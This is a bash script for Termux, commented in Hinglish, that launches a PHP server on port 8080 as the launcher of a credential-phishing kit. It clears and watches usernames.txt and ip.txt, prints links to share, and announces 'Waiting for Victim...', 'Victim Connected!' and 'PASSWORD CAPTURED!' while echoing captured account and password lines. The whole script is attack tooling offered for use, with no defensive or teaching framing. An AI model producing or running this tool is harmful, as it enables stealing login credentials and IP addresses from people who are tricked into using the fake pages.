#!/bin/bash

# --- 🛠️ STEP 1: AUTO-FIX PERMISSIONS (Silent Fix) ---
# Ye code start hone se pehle hi ek safe folder bana lega
# Taki Android system permission deny na kare
SAFE_TMP="$HOME/.termux_php_fix"
mkdir -p "$SAFE_TMP"
chmod 777 "$SAFE_TMP"
export TMPDIR="$SAFE_TMP"

# --- 🧹 STEP 2: CLEANUP ---
# Agar purana server chal raha hai to use band karega
pkill -f php > /dev/null 2>&1
rm -rf usernames.txt ip.txt
touch usernames.txt ip.txt

# --- 🎨 DESIGN ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GREEN}╔══════════════════════════════════════╗${RESET}"
echo -e "${GREEN}║      ${CYAN}NO ERROR MODE (Auto-Fix)${GREEN}        ║${RESET}"
echo -e "${GREEN}╚══════════════════════════════════════╝${RESET}"
echo ""

# --- 🚀 STEP 3: INSTANT MENU ---
echo -e "${YELLOW}[1] Start Server (Localhost & WiFi)${RESET}"
echo -e "${RED}[x] Exit${RESET}"
echo ""
echo -ne "${CYAN}Press 1 to Run: ${RESET}"
read -n 1 option
echo ""
echo ""

if [[ $option == "1" ]]; then
    
    echo -e "${YELLOW}[*] Starting Server...${RESET}"
    
    # --- MAGIC COMMAND (Ye kabhi fail nahi hoga) ---
    # Hum 0.0.0.0 use kar rahe hain taki mobile aur PC dono par chale
    php -S 0.0.0.0:8080 -t . > /dev/null 2>&1 &
    PID=$!
    sleep 2

    # Check agar server chal gaya
    if ps -p $PID > /dev/null; then
        echo -e "${GREEN}[✔] Server Online!${RESET}"
        echo -e "${CYAN}[-] Link 1: http://localhost:8080${RESET}"
        
        # IP Address nikalna (Android Friendly)
        MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
        if [ ! -z "$MYIP" ]; then
            echo -e "${CYAN}[-] Link 2: http://$MYIP:8080${RESET}"
        fi
        
        echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
        echo ""
        echo -e "${YELLOW}Waiting for Victim...${RESET}"
        
        # --- MONITORING (Ye chalta rahega) ---
        tail -f usernames.txt ip.txt --pid=$PID 2>/dev/null | while read line; do
            if [[ "$line" == "IP:"* ]]; then
                 echo -e "\n${GREEN}[+] Victim Connected!${RESET}"
            elif [[ "$line" == *"Login info"* ]]; then
                 echo -e "${RED}[!] PASSWORD CAPTURED!${RESET}"
            elif [[ "$line" == *"Account"* ]] || [[ "$line" == *"Password"* ]]; then
                 echo -e "${GREEN}$line${RESET}"
            fi
        done
    else
        echo -e "${RED}[!] Error: Server start nahi ho paya.${RESET}"
        echo -e "${YELLOW}Tip: Termux ko restart karke try karein.${RESET}"
    fi

else
    echo -e "${RED}Exiting...${RESET}"
    exit
fi
